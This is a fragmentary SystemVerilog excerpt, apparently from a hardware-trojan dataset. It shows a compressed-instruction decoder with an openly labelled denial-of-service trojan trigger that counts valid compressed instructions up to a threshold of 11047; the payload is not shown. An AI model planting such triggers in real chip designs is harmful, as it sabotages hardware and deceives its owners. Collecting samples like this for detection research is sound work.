...
module compressed_instr_decoder_trojan_DoS #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11047)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11047;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (compressed_valid_i) trojan_counter <= trojan_counter + 1;
